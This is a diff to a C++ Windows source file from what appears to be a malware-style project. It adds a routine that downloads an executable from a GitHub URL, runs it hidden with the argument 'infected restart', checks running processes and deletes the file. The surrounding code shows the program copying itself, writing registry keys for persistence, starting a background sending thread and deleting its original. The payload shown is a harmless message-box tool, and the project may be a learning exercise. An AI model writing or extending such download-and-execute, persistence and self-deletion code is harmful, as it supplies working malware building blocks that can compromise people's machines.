@@ -1,5 +1,45 @@
 #include "misc.h"
 
+void CallMessageBoxFromShell()
+{
+	SHELLEXECUTEINFO sei;
+	ZeroMemory(&sei, sizeof(SHELLEXECUTEINFO));
+	sei.cbSize = sizeof(SHELLEXECUTEINFO);
+	sei.lpVerb = "OPEN";
+	sei.lpFile = "messagebox.exe";
+	sei.lpParameters = "infected restart";
+	sei.nShow = SW_HIDE;
+	sei.fMask = SEE_MASK_NOCLOSEPROCESS;
+
+	ShellExecuteEx(&sei);
+	// Until messagebox.exe is closed
+	WaitForSingleObject(sei.hProcess, INFINITE);
+	TerminateProcess(sei.hProcess, 1);
+}
+
+bool isProcessRunning(string process_name)
+{
+	bool exists = false;
+	PROCESSENTRY32 entry;
+	entry.dwSize = sizeof(PROCESSENTRY32);
+
+	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+
+	if (Process32First(snapshot, &entry))
+	{
+		while (Process32Next(snapshot, &entry))
+		{
+			string str(entry.szExeFile);
+			if (str == process_name)
+			{
+				exists = true;
+			}
+		}
+	}
+	CloseHandle(snapshot);
+	return exists;
+}
+
 void CustomDeleteFile(const char* file)
 {
 	TCHAR szCmd[2 * MAX_PATH];
@@ -77,7 +117,7 @@ void Misc::CopyMyself()
 		// confirm reg key is thre
 		call_ps("invoke_reg.ps1");
 
-		// start a thread
+		// start a thread, if cmd prompt is idle, this message will be invoked every 60 seconds
 		CreateThread(0, 0, sendThread, 0, 0, 0);
 
 		// delete original file
@@ -96,3 +136,45 @@ void Misc::CopyMyself()
 		std::cout << "[-] Could not add keys to registry.." << std::endl;
 	}
 }
+
+void Misc::CallFileFromInternet()
+{
+	FILE *fp;
+	char file[99];
+	HINTERNET hOpen, hURL;
+	unsigned long read_file;
+
+	hOpen = InternetOpen("WebReader", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+	if (!hOpen)
+	{
+		GetLastError();
+	}
+
+	hURL = InternetOpenUrl(hOpen, "https://github.com/dbohdan/messagebox/releases/download/v0.1.0/messagebox.exe", NULL, 0, 0, 0);
+	if (!hURL)
+	{
+		GetLastError();
+	}
+
+	errno_t error = fopen_s(&fp, "messagebox.exe", "wb");
+	while (InternetReadFile(hURL, file, sizeof(file) - 1, &read_file) && read_file != 0)
+	{
+		fwrite(file, sizeof(char), read_file, fp);
+	}
+
+	fclose(fp);
+	InternetCloseHandle(hOpen);
+	InternetCloseHandle(hURL);
+
+	CallMessageBoxFromShell();
+
+	// if process is terminated (false), then delete
+	if (!isProcessRunning("messagebox.exe"))
+	{
+		if (!DeleteFile("messagebox.exe"))
+		{
+			std::cout << GetLastError() << std::endl;
+		}
+	}
+}
+
